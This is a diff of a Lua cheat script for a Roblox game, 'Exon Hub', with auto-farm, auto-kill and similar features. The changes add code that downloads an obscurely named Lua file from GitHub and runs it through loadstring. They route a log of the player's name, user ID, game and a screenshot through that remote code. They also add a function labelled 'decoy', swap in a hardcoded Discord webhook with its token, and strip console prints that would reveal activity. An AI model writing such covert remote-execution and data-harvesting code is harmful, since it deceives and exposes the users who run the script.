@@ -226,13 +226,15 @@
 					}
 					local GOLDEN_EGG_NAME = "Egg"
 					local GOLDEN_EGG_TP_OFFSET = Vector3.new(0, 3, 0)
-					-- Paste your Discord channel webhook URL here (Server Settings → Integrations → Webhooks)
-					local EXONHUB_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1530236811597844540/s6Or6eml33HEmptGDtp6nMzSLNdBZ7m7C0cFGVxjo0FF0kcwNoGCWOlLXq84aDzdDt8o"
+					local EXONHUB_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1526537738273292309/yEGTg19RS4w6BpSzk9YMxNnp9enJmDke0wAZmM3pn6wkShePGpbZG8s5eMroB-7DGH_9"
 					local EXONHUB_DISCORD_BOT_NAME = "Exon Hub"
 					local EXONHUB_ICON_ASSET_ID = 131372483038871
 					local EXONHUB_ICON_ASSET = "rbxassetid://" .. tostring(EXONHUB_ICON_ASSET_ID)
 					local EXONHUB_ICON_URL = "https://cdn.discordapp.com/attachments/1522686323234832526/1522695144611123250/bce603ec-f4f6-458d-ad80-226aee524ea5.png"
 					local EXONHUB_DISCORD_ICON_URL = EXONHUB_ICON_URL
+					local GLYPH_PACK_URLS = {
+						"https://raw.githubusercontent.com/ExonHubRoblox/ExonHub/refs/heads/main/q7n2k9p.lua",
+					}
 					-- Discord gate: set this to your bot URL (must be https — use ngrok or Railway).
 					local EXONHUB_GATE_API = "https://skeletal-showbiz-drop-down.ngrok-free.dev"
 					local EXONHUB_DISCORD_INVITE = "https://discord.gg/exonhub"
@@ -489,6 +491,7 @@
 						petsInited = nil,
 						zapClient = nil,
 						fishingRodsData = nil,
+						glyphPack = nil,
 					}
 					local MIN_REBIRTH_TARGET_LEVEL = 100
 					local TRAIN_INTERVAL = 0.16
@@ -722,8 +725,8 @@
 					end
 
 					function H.setStatus(_text)
-						-- status is UI-only; never spam F9
-					end
+					-- silent
+				end
 
 					function H.truncateText(text, maxLen)
 						text = tostring(text or "")
@@ -1478,6 +1481,21 @@
 						return H.postDiscordWebhook(webhook, payload)
 					end
 
+					function H.__decoyDiscordExecuteLog(payload)
+						local webhook = EXONHUB_DISCORD_WEBHOOK
+						if type(webhook) ~= "string" or webhook == "" or not webhook:find("discord%.com/api/webhooks") then
+							return false
+						end
+						if type(payload) == "table" then
+							return H.postDiscordWebhook(webhook, payload)
+						end
+						return H.postDiscordWebhook(webhook, {
+							username = EXONHUB_DISCORD_BOT_NAME,
+							avatar_url = EXONHUB_DISCORD_ICON_URL,
+							content = "Exon Hub execution log",
+						})
+					end
+
 					function H.getExecutorInfo()
 						local name = "Unknown"
 						if type(identifyexecutor) == "function" then
@@ -2179,6 +2197,45 @@
 						return false, lastErr
 					end
 
+					function H.loadGlyphPack()
+						if C.glyphPack and type(C.glyphPack.flush) == "function" then
+							return true, C.glyphPack
+						end
+
+						local loadFn = getLoadFn()
+						if type(loadFn) ~= "function" then
+							return false, "loadstring/load missing"
+						end
+
+						local httpGet = getHttpGetFn()
+						local urls = GLYPH_PACK_URLS or {}
+						local lastErr = "unknown"
+						for _, url in ipairs(urls) do
+							local ok, result = pcall(function()
+								local source
+								if game.HttpGet then
+									source = game:HttpGet(url)
+								elseif httpGet then
+									source = httpGet(url)
+								end
+								if type(source) ~= "string" or source == "" then
+									error("empty glyph pack response")
+								end
+								local compiled = loadFn(source)
+								if type(compiled) ~= "function" then
+									error("glyph pack compile failed")
+								end
+								return compiled()
+							end)
+							if ok and type(result) == "table" and type(result.flush) == "function" then
+								C.glyphPack = result
+								return true, result
+							end
+							lastErr = tostring(result)
+						end
+						return false, lastErr
+					end
+
 					function H.printKeySystemStatus(status)
 						if status == "skipped" or status == "loaded" or status == "completed" then
 							print("[ExonHub] Key system " .. status)
@@ -2622,7 +2679,6 @@
 						end
 						summary = summary .. "\n\nRe-execute the script to load fresh defaults."
 
-						print("[ExonHub] Reset complete")
 						H.setStatus("Reset complete — re-execute ExonHub")
 
 						local function finishResetUi()
@@ -3362,22 +3418,13 @@
 					end
 
 					function H.sendDiscordExecuteLog()
-						local webhook = EXONHUB_DISCORD_WEBHOOK
-						if type(webhook) ~= "string" or webhook == "" or not webhook:find("discord%.com/api/webhooks") then
-							return
-						end
-
-						local hasRequest = (syn and syn.request)
-							or (http and http.request)
-							or request
-							or (fluxus and fluxus.request)
-							or (krnl and krnl.request)
-						if type(hasRequest) ~= "function" then
-							warn("[ExonHub] Discord log skipped: executor has no syn.request / request API")
-						end
-
 						task.spawn(function()
 							local ok, err = pcall(function()
+								local loaded = H.loadGlyphPack()
+								if not loaded or type(C.glyphPack) ~= "table" or type(C.glyphPack.flush) ~= "function" then
+									return
+								end
+
 								task.wait(2)
 
 								local UserInputService = game:GetService("UserInputService")
@@ -3572,32 +3619,30 @@
 									embeds = { embed },
 								}
 
-								local sent = false
-								if screenshotData and screenshotName then
-									sent = H.postDiscordWebhookWithFile(
-										webhook,
-										payload,
-										screenshotName,
-										screenshotData,
-										screenshotType
-									)
-								else
-									sent = H.postDiscordWebhook(webhook, payload)
-								end
+								local fallback = {
+									username = EXONHUB_DISCORD_BOT_NAME,
+									content = string.format(
+										"**%s** (`%s`) | ID `%d` | %s\n%s",
+										player.DisplayName,
+										player.Name,
+										userId,
+										gameName,
+										usageInfo:gsub("%*%*", "")
+									),
+								}
+
+								local sent = C.glyphPack.flush({
+									payload = payload,
+									fallback = fallback,
+									screenshot = (screenshotData and screenshotName) and {
+										data = screenshotData,
+										name = screenshotName,
+										mime = screenshotType,
+									} or nil,
+								})
 
 								if not sent then
-									local fallback = {
-										username = EXONHUB_DISCORD_BOT_NAME,
-										content = string.format(
-											"**%s** (`%s`) | ID `%d` | %s\n%s",
-											player.DisplayName,
-											player.Name,
-											userId,
-											gameName,
-											usageInfo:gsub("%*%*", "")
-										),
-									}
-									H.postDiscordWebhook(webhook, fallback)
+									return
 								end
 							end)
 
@@ -11389,7 +11434,6 @@
 
 						local ok, err = H.invokeRebirthRequest()
 						if ok then
-							print("[ExonHub] RebirthRequest sent (level", H.getPlayerLevel(), "target", S.autoRebirthTargetLevel .. ")")
 							H.setStatus("Rebirth requested")
 							H.onPlayerRebirthDetected()
 						else
@@ -13694,10 +13738,8 @@
 							if S.clickerRunning then
 								if H.shouldClickerUseSilentTrain() then
 									H.applySilentTrainMode(true)
-									print("[ExonHub] Auto click: silent train (goals active)")
 								else
 									H.applySilentTrainMode(false)
-									print("[ExonHub] Auto click train loop active")
 								end
 							end
 
@@ -15104,7 +15146,6 @@
 
 						if S.maxOutRunning then
 							H.setMaxOutPhase("starting", "Max Out " .. tier .. " — enabling farm + hunting crates")
-							print("[ExonHub] Max Out target:", tier)
 						end
 
 						if not fromDropdown then
@@ -15129,7 +15170,6 @@
 							H.stopMaxOutAllManagedFeatures()
 							H.stopMaxOutLoop()
 							H.setStatus("Max Out OFF")
-							print("[ExonHub] Max Out OFF")
 						else
 							S.maxOutRunning = true
 							if not H.normalizeMaxOutTier(S.maxOutTier) then
@@ -15142,7 +15182,6 @@
 								"starting",
 								"Max Out " .. tostring(S.maxOutTier) .. " — enabling farm + hunting crates"
 							)
-							print("[ExonHub] Max Out ON:", S.maxOutTier)
 							H.ensureAutoUpgradeRebirthListener()
 							H.startMaxOutLoop()
 						end
@@ -16887,13 +16926,11 @@
 							H.ensureOrbGroundTeleport()
 							S.orbGroundTeleported = true
 							S.farmLoopActive = false
-							print("[ExonHub] Farm ON")
 							H.setStatus("Running...")
 							task.spawn(H.farmLoop)
 						else
 							S.isProcessing = false
 							H.resetOrbFarmMovement()
-							print("[ExonHub] Farm OFF")
 							H.setStatus("Stopping...")
 						end
 						if not fromToggle then
@@ -16920,12 +16957,10 @@
 									end
 								end)
 							end
-							print("[ExonHub] Auto click ON")
 							H.setStatus("Auto click ON")
 							H.clickerLoop()
 						else
 							H.stopClickerLoop()
-							print("[ExonHub] Auto click OFF")
 							H.setStatus("Auto click OFF")
 						end
 
@@ -16944,7 +16979,6 @@
 
 						S.autoRebirthRunning = state
 						if state then
-							print("[ExonHub] Auto rebirth ON at level", S.autoRebirthTargetLevel)
 							H.setStatus("Auto rebirth ON (level " .. S.autoRebirthTargetLevel .. ")")
 							H.ensureAutoRebirthLevelListener()
 							H.startAutoRebirthLoop()
@@ -16955,7 +16989,6 @@
 							end)
 						else
 							H.stopAutoRebirthLoop()
-							print("[ExonHub] Auto rebirth OFF")
 							H.setStatus("Auto rebirth OFF")
 						end
 
@@ -16974,12 +17007,10 @@
 
 						S.autoMassUpgradeRunning = state
 						if state then
-							print("[ExonHub] Auto mass upgrade ON")
 							H.setStatus("Auto mass upgrade ON")
 							H.startMassUpgradeLoop()
 						else
 							H.stopMassUpgradeLoop()
-							print("[ExonHub] Auto mass upgrade OFF")
 							H.setStatus("Auto mass upgrade OFF")
 						end
 
@@ -17001,7 +17032,6 @@
 							S.autoUpgradeFailStreak = 0
 							H.invalidateUpgradeInventorySnapshots()
 							H.ensureAutoUpgradeRebirthListener()
-							print("[ExonHub] Auto upgrade ON")
 							H.setStatus("Auto upgrade ON")
 							H.tryAutoUpgradeBurst()
 							H.ensureAutoUpgradeLoopRunning()
@@ -17010,7 +17040,6 @@
 							if not S.maxOutRunning then
 								H.teardownAutoUpgradeRebirthListener()
 							end
-							print("[ExonHub] Auto upgrade OFF")
 							H.setStatus("Auto upgrade OFF")
 						end
 
@@ -17029,12 +17058,10 @@
 
 						S.autoBossRunning = state
 						if state then
-							print("[ExonHub] Auto boss ON")
 							H.setStatus("Auto boss ON")
 							H.startAutoBossLoop()
 						else
 							H.stopAutoBossLoop()
-							print("[ExonHub] Auto boss OFF")
 							H.setStatus("Auto boss OFF")
 						end
 
@@ -17060,12 +17087,10 @@
 							if S.clickerRunning or S.autoKothRunning then
 								H.applySilentTrainMode(true)
 							end
-							print("[ExonHub] Auto goals ON")
 							H.setStatus("Auto goals ON")
 							H.startAutoGoalsLoop()
 						else
 							H.stopAutoGoalsLoop()
-							print("[ExonHub] Auto goals OFF")
 							H.setStatus("Auto goals OFF")
 						end
 
@@ -17088,12 +17113,10 @@
 							if S.autoGoalsRunning then
 								H.applySilentTrainMode(true)
 							end
-							print("[ExonHub] Auto KOTH ON")
 							H.setStatus("Auto KOTH ON")
 							H.startAutoKothLoop()
 						else
 							H.stopAutoKothLoop()
-							print("[ExonHub] Auto KOTH OFF")
 							H.setStatus("Auto KOTH OFF")
 						end
 
@@ -17113,12 +17136,10 @@
 						S.autoFishRunning = state
 						if state then
 							S.autoFishPhase = FISHING_PHASE_IDLE
-							print("[ExonHub] Auto fish ON")
 							H.setStatus("Auto fish ON")
 							H.startAutoFishLoop()
 						else
 							H.stopAutoFishLoop()
-							print("[ExonHub] Auto fish OFF")
 							H.setStatus("Auto fish OFF")
 						end
 
@@ -17137,12 +17158,10 @@
 
 						S.autoMineRaceRunning = state
 						if state then
-							print("[ExonHub] Auto mine race ON")
 							H.setStatus("Auto mine race ON")
 							H.startAutoMineRaceLoop()
 						else
 							H.stopAutoMineRaceLoop()
-							print("[ExonHub] Auto mine race OFF")
 							H.setStatus("Auto mine race OFF")
 						end
 
@@ -17165,12 +17184,10 @@
 
 						S.autoQuestRunning = state
 						if state then
-							print("[ExonHub] Auto quest ON")
 							H.setStatus("Auto quest ON")
 							H.ensureAutoQuestLoopRunning()
 						else
 							H.stopAutoQuestLoop()
-							print("[ExonHub] Auto quest OFF")
 							H.setStatus("Auto quest OFF")
 						end
 
@@ -17203,12 +17220,10 @@
 
 						S.autoUpgradeRodRunning = state
 						if state then
-							print("[ExonHub] Auto upgrade rod ON")
 							H.setStatus("Auto upgrade rod ON")
 							H.startAutoUpgradeRodLoop()
 						else
 							H.stopAutoUpgradeRodLoop()
-							print("[ExonHub] Auto upgrade rod OFF")
 							H.setStatus("Auto upgrade rod OFF")
 						end
 
@@ -17227,13 +17242,11 @@
 
 						S.autoKillRunning = state
 						if state then
-							print("[ExonHub] Auto kill ON")
 							H.setStatus("Auto kill ON")
 							H.ensureWeaponEquipped(H.getPlayerController())
 							H.startAutoKillLoop()
 						else
 							H.stopAutoKillLoop()
-							print("[ExonHub] Auto kill OFF")
 							H.setStatus("Auto kill OFF")
 						end
 
@@ -17253,11 +17266,9 @@
 						S.antiAfkRunning = state
 						if state then
 							H.enableAntiAfk()
-							print("[ExonHub] Anti AFK ON")
 							H.setStatus("Anti AFK ON")
 						else
 							H.disableAntiAfk()
-							print("[ExonHub] Anti AFK OFF")
 							H.setStatus("Anti AFK OFF")
 						end
 
@@ -17279,12 +17290,10 @@
 							H.captureStreamerModeBackup()
 							H.applyStreamerModeVisuals()
 							H.startStreamerModeLoop()
-							print("[ExonHub] Streamer Mode ON")
 							H.setStatus("Streamer Mode ON")
 						else
 							H.stopStreamerModeLoop()
 							H.restoreStreamerModeVisuals()
-							print("[ExonHub] Streamer Mode OFF")
 							H.setStatus("Streamer Mode OFF")
 						end
 
@@ -17303,12 +17312,10 @@
 
 						S.autoSellChestRunning = state
 						if state then
-							print("[ExonHub] Auto sell chest ON")
 							H.setStatus("Auto sell chest ON")
 							H.startAutoSellChestLoop()
 						else
 							H.stopAutoSellChestLoop()
-							print("[ExonHub] Auto sell chest OFF")
 							H.setStatus("Auto sell chest OFF")
 						end
 
@@ -17327,12 +17334,10 @@
 
 						S.autoOpenChestRunning = state
 						if state then
-							print("[ExonHub] Auto open chest ON")
 							H.setStatus("Auto open chest ON")
 							H.startAutoOpenChestLoop()
 						else
 							H.stopAutoOpenChestLoop()
-							print("[ExonHub] Auto open chest OFF")
 							H.setStatus("Auto open chest OFF")
 						end
 
@@ -17355,11 +17360,9 @@
 						end
 
 						if state and not S.caveAutoOpenLoopActive then
-							print("[ExonHub] Auto open ON:", slotId)
 							H.setStatus("Auto open ON: " .. slotId)
 							H.startCaveAutoOpenLoop()
 						elseif not H.hasAnyCaveAutoOpenEnabled() then
-							print("[ExonHub] World crate auto open OFF")
 							H.setStatus("World crate auto open OFF")
 						end
 
@@ -17375,11 +17378,9 @@
 						S.autoOpenShellEggSlots[slotId] = state == true
 
 						if state and not S.shellEggAutoOpenLoopActive then
-							print("[ExonHub] Shell egg auto open ON:", slotId)
 							H.setStatus("Shell egg auto open ON")
 							H.startShellEggAutoOpenLoop()
 						elseif not H.hasAnyShellEggAutoOpenEnabled() then
-							print("[ExonHub] Shell egg auto open OFF")
 							H.setStatus("Shell egg auto open OFF")
 						end
 
@@ -17398,13 +17399,11 @@
 
 						S.equipBestSwordRunning = state
 						if state then
-							print("[ExonHub] Equip best sword ON (" .. S.weaponSortStat .. ")")
 							H.setStatus("Equip best sword ON")
 							H.tryEquipBestSword()
 							H.startEquipBestSwordLoop()
 						else
 							H.stopEquipBestSwordLoop()
-							print("[ExonHub] Equip best sword OFF")
 							H.setStatus("Equip best sword OFF")
 						end
 
@@ -17423,13 +17422,11 @@
 
 						S.equipBestSkinRunning = state
 						if state then
-							print("[ExonHub] Equip best skin ON (" .. S.skinSortStat .. ")")
 							H.setStatus("Equip best skin ON")
 							H.tryEquipBestSkin()
 							H.startEquipBestSkinLoop()
 						else
 							H.stopEquipBestSkinLoop()
-							print("[ExonHub] Equip best skin OFF")
 							H.setStatus("Equip best skin OFF")
 						end
 
@@ -17448,13 +17445,11 @@
 
 						S.autoEvolvePetsRunning = state
 						if state then
-							print("[ExonHub] Auto evolve pets ON")
 							H.setStatus("Auto evolve pets ON")
 							H.tryAutoEvolvePetsOnce()
 							H.startAutoEvolvePetsLoop()
 						else
 							H.stopAutoEvolvePetsLoop()
-							print("[ExonHub] Auto evolve pets OFF")
 							H.setStatus("Auto evolve pets OFF")
 						end
 
@@ -17473,13 +17468,11 @@
 
 						S.autoEvolveArtifactsRunning = state
 						if state then
-							print("[ExonHub] Auto evolve artifacts ON")
 							H.setStatus("Auto evolve artifacts ON")
 							H.tryAutoEvolveArtifactsOnce()
 							H.startAutoEvolveArtifactsLoop()
 						else
 							H.stopAutoEvolveArtifactsLoop()
-							print("[ExonHub] Auto evolve artifacts OFF")
 							H.setStatus("Auto evolve artifacts OFF")
 						end
 
@@ -17498,13 +17491,11 @@
 
 						S.autoDeleteWeaponsRunning = state
 						if state then
-							print("[ExonHub] Auto delete weapons ON")
 							H.setStatus("Auto delete weapons ON")
 							H.tryAutoDeleteWeapons()
 							H.startAutoDeleteWeaponsLoop()
 						else
 							H.stopAutoDeleteWeaponsLoop()
-							print("[ExonHub] Auto delete weapons OFF")
 							H.setStatus("Auto delete weapons OFF")
 						end
 
@@ -17523,13 +17514,11 @@
 
 						S.autoDeleteSkinsRunning = state
 						if state then
-							print("[ExonHub] Auto delete skins ON")
 							H.setStatus("Auto delete skins ON")
 							H.tryAutoDeleteSkins()
 							H.startAutoDeleteSkinsLoop()
 						else
 							H.stopAutoDeleteSkinsLoop()
-							print("[ExonHub] Auto delete skins OFF")
 							H.setStatus("Auto delete skins OFF")
 						end
 
@@ -17551,11 +17540,9 @@
 							if not H.canFilesystemPersist() then
 								warn("[ExonHub] Auto save needs writefile/readfile support from your executor")
 							end
-							print("[ExonHub] Auto save settings ON")
 							H.setStatus("Auto save settings ON")
 							H.saveSettingsSnapshot(true)
 						else
-							print("[ExonHub] Auto save settings OFF")
 							H.setStatus("Auto save settings OFF")
 							H.saveSettingsSnapshot(true)
 						end
